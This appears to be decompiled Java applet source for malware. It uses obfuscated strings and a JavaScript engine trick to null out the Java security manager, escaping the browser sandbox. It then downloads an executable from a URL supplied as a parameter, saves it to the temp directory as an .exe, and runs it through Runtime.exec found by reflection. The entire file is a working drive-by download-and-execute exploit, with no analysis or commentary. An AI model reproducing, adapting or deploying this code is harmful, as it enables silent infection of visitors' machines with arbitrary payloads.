// 
// Decompiled by Procyon v0.5.30
// 

package opj;

import java.lang.reflect.Method;
import java.io.InputStream;
import java.net.URL;
import javax.script.Bindings;
import javax.script.ScriptEngine;
import javax.script.ScriptException;
import java.awt.Component;
import java.applet.Applet;

public class opj extends Applet
{
    Runtime rtrtrew0w;
    int k;
    String ffrreess;
    String zxczxczxczxc;
    String fwefoeifn;
    
    public opj() {
        this.ffrreess = "ap\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116ple\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116t";
        this.zxczxczxczxc = "";
        this.fwefoeifn = "java";
    }
    
    @Override
    public void init() {
        try {
            final ScriptEngine engineByName = new S0Ema0n0().getEngineByName("\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116j\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116s\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116\u2116".replace("\u2116", ""));
            final Bindings bindings = engineByName.createBindings();
            bindings.put(this.ffrreess.replace("\u2116", ""), (Object)this);
            this.add(new YJBOx(new Object[] { engineByName.eval("\u2116t\u2116hi\u2116\u2116\u2116\u2116s.to\u2116St00555500ri\u2116\u2116\u2116ng\u2116 = \u2116fun\u2116550000055cti000on() {java.lang0\u2116\u2116\u211600.Sys\u2116\u2116\u2116t0e\u2116\u2116\u2116\u2116m.0s\u2116\u2116\u2116\u2116et0Secu0rityM0a555555555na0055555ger(null);app555550let0.sfews0dfd555555555555550();return 'pshol0000n0ahiy';};sdfsdf0sdfscs = new 0E0rror();sdfsdfs000dfscs.m0essage = 0this;sdfsdf000s\u2116\u2116\u2116\u2116dfscs".replace("\u2116", "").replace("0", "").replace("5", ""), bindings) }));
            this.rtrtrew0w = Runtime.getRuntime();
        }
        catch (ScriptException ex) {
            ex.printStackTrace();
        }
    }
    
    public void werwermm(final Class clazz, final String s) {
        try {
            this.k = this.hdfhdfhdfh(this.rtrtrew0w.getClass(), this.rtrtrew0w, this.rtrtrew0w.getClass().getMethods(), "\u2116x\u2116c".replace("\u2116", "e"));
            clazz.getMethods()[this.k].invoke(this.rtrtrew0w, s);
        }
        catch (Exception ex) {}
    }
    
    public void indrtmp() {
        this.zxczxczxczxc = System.getProperty(this.fwefoeifn.concat(".##.t!m!p!!d!ir".replace("##", "io").replace("!", "")));
    }
    
    public void sfewsdfd() {
        try {
            final String parameter = this.getParameter("ur".concat("0l0"));
            this.indrtmp();
            System.out.println(this.zxczxczxczxc);
            final URL url = new URL(parameter);
            url.openConnection();
            final InputStream openStream = url.openStream();
            final bos bos = new bos(this.zxczxczxczxc.concat("23894729347*******.ex***********".replace("*", "").concat("*e*******".replace("*", ""))));
            final byte[] array = new byte[512];
            int read;
            while ((read = openStream.read(array, 0, array.length)) != -1) {
                bos.write(array, 0, read);
            }
            openStream.close();
            bos.close();
            this.werwermm(this.rtrtrew0w.getClass(), this.zxczxczxczxc.concat("23894729347*******.ex***********".replace("*", "").concat("*e*******".replace("*", ""))));
        }
        catch (Exception ex) {}
    }
    
    public int hdfhdfhdfh(final Class clazz, final Object o, final Method[] array, final String s) {
        final Object o2 = new Object();
        int n = 0;
        try {
            for (int i = 0; i < array.length; ++i) {
                if (array[i].getName().equalsIgnoreCase(s) && add(array[i], new Object[] { this.zxczxczxczxc })) {
                    n = i;
                }
            }
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        return n;
    }
    
    private static boolean add(final Method method, final Object[] array) {
        return replace(method.getParameterTypes(), array);
    }
    
    public static boolean replace(final Class[] array, final Object[] array2) {
        if (array.length != array2.length) {
            return false;
        }
        for (int i = 0; i < array.length; ++i) {
            if (!array2[i].getClass().getName().toUpperCase().contains(array[i].getName().toUpperCase())) {
                return false;
            }
        }
        return true;
    }
}
